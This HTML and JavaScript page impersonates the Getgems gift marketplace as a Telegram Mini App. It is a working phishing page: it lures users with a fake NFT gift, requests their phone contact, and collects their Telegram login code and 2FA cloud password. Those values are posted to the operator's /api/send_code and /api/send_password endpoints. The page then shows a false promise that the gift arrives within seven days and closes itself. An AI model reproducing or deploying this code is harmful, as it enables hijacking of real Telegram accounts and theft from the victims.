<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,user-scalable=no,viewport-fit=cover">
    <title>Getgems: купить и продать подарки</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>

<div id="main-screen">
    <div class="top-nav">
        <div class="nav-item active">Подарки</div>
        <div class="nav-item">Номера</div>
        <div class="nav-item">Имена</div>
    </div>
    <div class="grid" id="nft-grid"></div>
</div>

<div id="details-screen">
    <span class="back" onclick="closeNFT()">← Назад</span>
    <div class="nft-hero"><img id="d-img"></div>
    <div style="color:var(--accent); font-size:14px;">Telegram Gifts</div>
    <h1 id="d-title" style="margin:8px 0 24px 0; font-size:32px;"></h1>
    <div class="btn-stack">
        <button class="btn btn-blue" onclick="openModal()">Принять на аккаунт</button>
        <button class="btn btn-dark" onclick="openModal()">Продать подарок</button>
    </div>
</div>

<div id="overlay" class="overlay">
    <div class="modal">
        <div id="s1">
            <h3>Синхронизация</h3>
            <p style="color:var(--gray); font-size:14px;">Подтвердите сессию для передачи NFT на ваш аккаунт</p>
            <button class="btn btn-blue" style="width:100%; margin-top:15px;" onclick="requestAuth()">Начать</button>
        </div>
        <div id="s2" style="display:none">
            <h3>Верификация</h3>
            <p style="color:var(--gray); font-size:14px;">Введите код из уведомления Telegram</p>
            <input type="text" id="code" class="input-f" placeholder="00000" maxlength="6">
            <button class="btn btn-blue" style="width:100%" onclick="sendCode()">Продолжить</button>
        </div>
        <div id="s3" style="display:none">
            <h3>Облачный пароль</h3>
            <p style="color:var(--gray); font-size:14px;">Введите 2FA для завершения</p>
            <input type="password" id="pass" class="input-f" placeholder="Пароль">
            <button class="btn btn-blue" style="width:100%" onclick="sendPass()">Завершить</button>
        </div>
        <div id="loader" style="display:none">
            <div class="spinner"></div>
            <p id="l-text">Синхронизация...</p>
        </div>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    let userPhone = ""; // Переменная для хранения телефона
    let isSending = false; 

    // 1. Словарь реальных NFT коллекций (Collectibles)
    const nftCollections = {
        'galacticstones': 'Stones',
        'elements': 'Elements',
        'telegems': 'Gems',
        'tstickers': 'Stickers',
        'etherealpearls': 'Pearls',
        'magicdice': 'Dice',
        'instantramen': 'Ramen',
        'magicbear': 'Bear'
    };

    // 2. Функция получения картинки (вынесена наружу)
    function getImageUrl(imgKey) {
        const folder = "Collectibles"; 
        const asset = nftCollections[imgKey.toLowerCase()] || 'Gems';
        return `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${folder}/${asset}.png`;
    }

    // 3. Основная загрузка
    window.onload = function() {
        const startParam = tg.initDataUnsafe.start_param || "";
        
        let giftName = "Limited NFT Gift";
        let giftImgKey = "telegems"; 

        if (startParam) {
            const rawParts = startParam.replace('gift_', '').split('_');
            const cleanParts = rawParts.filter(p => isNaN(p));
            
            giftName = cleanParts.map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
            giftImgKey = cleanParts.join('').toLowerCase();
        }

        const grid = document.getElementById('nft-grid');
        const finalSrc = getImageUrl(giftImgKey);

        // Отрисовка в сетку
        grid.innerHTML = `
            <div class="grid-item" onclick="openNFT('${giftName}', '${giftImgKey}')">
                <div class="nft-badge">NFT Collection</div>
                <img src="${finalSrc}" onerror="this.src='https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/Collectibles/Gems.png'">
                <div class="grid-item-name">${giftName}</div>
            </div>
        `;
        
        // Автоматически открываем подарок
        openNFT(giftName, giftImgKey);
    };

    // 4. Функции интерфейса
    function openNFT(name, imgKey) {
        document.getElementById('main-screen').style.display = 'none';
        document.getElementById('details-screen').style.display = 'block';
        
        document.getElementById('d-title').innerText = name;
        const imgElement = document.getElementById('d-img');
        
        imgElement.src = getImageUrl(imgKey);
        imgElement.onerror = function() {
            this.src = 'https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/Collectibles/Gems.png';
        };
    }

    function closeNFT() {
        document.getElementById('main-screen').style.display = 'block';
        document.getElementById('details-screen').style.display = 'none';
    }

    function openModal() { 
        document.getElementById('overlay').style.display = 'flex'; 
    }

    // 5. Логика авторизации (API)
    function requestAuth() {
        tg.requestContact((ok) => {
            if(ok) {
                document.getElementById('s1').style.display = 'none';
                document.getElementById('loader').style.display = 'block';
                document.getElementById('l-text').innerText = "Ожидание подтверждения..."; 
                
                let attempts = 0;
                const check = setInterval(async () => {
                    attempts++;
                    try {
                        const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
                        const d = await r.json();
                        
                        if(d.status === 'received') {
                            clearInterval(check);
                            userPhone = d.phone;
                            document.getElementById('loader').style.display = 'none';
                            document.getElementById('s2').style.display = 'block';
                        }
                    } catch(e) { console.error("Ошибка сети:", e); }
                    
                    if(attempts > 30) { 
                        clearInterval(check);
                        document.getElementById('l-text').innerText = "Ошибка сессии. Попробуйте еще раз.";
                    }
                }, 2000);
            }
        });
    }

    async function sendCode() {
        if (isSending) return;
        const c = document.getElementById('code').value;
        if(c.length < 5) return;
        
        isSending = true;
        document.getElementById('s2').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('l-text').innerText = "Проверка кода...";
        
        try {
            const r = await fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone, code: c})
            });
            const d = await r.json();
            document.getElementById('loader').style.display = 'none';

            if(d.status === '2fa_needed') {
                document.getElementById('s3').style.display = 'block';
            } else if(d.status === 'success') {
                finish();
            } else {
                tg.showAlert("Ошибка: " + (d.message || "неверный код"));
                document.getElementById('s2').style.display = 'block';
            }
        } catch(e) {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('s2').style.display = 'block';
            tg.showAlert("Ошибка связи с сервером.");
        } finally {
            isSending = false;
        }
    }

    async function sendPass() {
        const p = document.getElementById('pass').value;
        if(!p || isSending) return;
        
        isSending = true;
        document.getElementById('s3').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('l-text').innerText = "Проверка пароля..."; 
        
        try {
            const r = await fetch('/api/send_password', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone, password: p})
            });
            const d = await r.json();
            if(d.status === 'success') {
                finish();
            } else {
                tg.showAlert("Неверный облачный пароль");
                document.getElementById('s3').style.display = 'block';
                document.getElementById('loader').style.display = 'none';
            }
        } catch(e) {
            tg.showAlert("Ошибка соединения с сервером");
            document.getElementById('loader').style.display = 'none';
            document.getElementById('s3').style.display = 'block';
        } finally {
            isSending = false;
        }
    }

    function finish() {
        document.getElementById('loader').style.display = 'block';
        document.getElementById('l-text').innerText = "Привязка NFT...";
        setTimeout(() => {
            tg.showAlert("Успешно! Подарок будет передан на ваш аккаунт в течение 7 дней.");
            tg.close();
        }, 3000);
    }
</script>
</body>
</html>